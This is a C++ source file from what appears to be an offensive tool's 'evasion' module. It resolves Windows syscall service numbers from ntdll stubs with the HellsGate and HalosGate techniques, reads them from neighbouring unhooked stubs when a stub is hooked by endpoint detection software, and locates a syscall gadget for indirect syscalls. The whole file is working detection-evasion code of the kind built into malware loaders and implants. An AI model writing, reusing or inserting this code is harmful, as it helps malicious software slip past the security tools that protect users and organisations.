#include "Syscalls.h"
#include <winternl.h>
#include <algorithm>

namespace evasion {

SyscallResolver& SyscallResolver::GetInstance() {
    static SyscallResolver instance;
    return instance;
}

SyscallResolver::SyscallResolver() {
    ResolveAll();
}

void SyscallResolver::ResolveAll() {
    // Get ntdll base address from PEB
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dosHeader->e_lfanew);
    DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hNtdll + exportDirRVA);

    PDWORD namePtr = (PDWORD)((BYTE*)hNtdll + exportDir->AddressOfNames);
    PDWORD addrPtr = (PDWORD)((BYTE*)hNtdll + exportDir->AddressOfFunctions);
    PWORD ordPtr = (PWORD)((BYTE*)hNtdll + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)hNtdll + namePtr[i]);
        if (name[0] == 'Z' && name[1] == 'w') { // Zw functions share SSNs with Nt
            // Logic to find SSN
            PBYTE funcAddr = (PBYTE)hNtdll + addrPtr[ordPtr[i]];
            
            // Search for: mov eax, SSN (0xB8)
            // HellsGate: find SSN directly from stub
            DWORD ssn = 0;
            bool found = false;

            // Look for 'mov eax, SSN' pattern: 4C 8B D1 B8 SSN_LOW SSN_HIGH 00 00
            // Or just B8 SSN_LOW SSN_HIGH 00 00
            for (int offset = 0; offset < 32; offset++) {
                if (funcAddr[offset] == 0xB8) { // mov eax, imm32
                    ssn = *(DWORD*)&funcAddr[offset + 1];
                    found = true;
                    break;
                }
                
                // HalosGate: If we hit a jump (EDR hook), look at neighboring functions
                if (funcAddr[offset] == 0xE9) { // jmp
                    // Check up and down for unhooked neighbors
                    for (int idx = 1; idx < 10; idx++) {
                        // Check neighbor above
                        PBYTE neighborUpper = funcAddr - (idx * 32); 
                        if (neighborUpper[3] == 0xB8) {
                            ssn = (*(DWORD*)&neighborUpper[4]) + idx;
                            found = true;
                            break;
                        }
                        // Check neighbor below
                        PBYTE neighborLower = funcAddr + (idx * 32);
                        if (neighborLower[3] == 0xB8) {
                            ssn = (*(DWORD*)&neighborLower[4]) - idx;
                            found = true;
                            break;
                        }
                    }
                }
                if (found) break;
            }

            if (found) {
                std::string ntName = name;
                ntName[0] = 'N'; ntName[1] = 't';
                m_syscallMap[ntName] = ssn;
                
                // Find a syscall gadget if we haven't already
                if (!m_syscallGadget) {
                    for (int g = 0; g < 64; g++) {
                        if (funcAddr[g] == 0x0F && funcAddr[g+1] == 0x05 && funcAddr[g+2] == 0xC3) {
                            m_syscallGadget = (PVOID)(funcAddr + g);
                        }
                    }
                }
            }
        }
    }
}

DWORD SyscallResolver::GetServiceNumber(const std::string& functionName) {
    if (m_syscallMap.count(functionName)) {
        return m_syscallMap[functionName];
    }
    return 0xFFFFFFFF;
}

PVOID SyscallResolver::GetSyscallGadget() {
    return m_syscallGadget;
}

} // namespace evasion
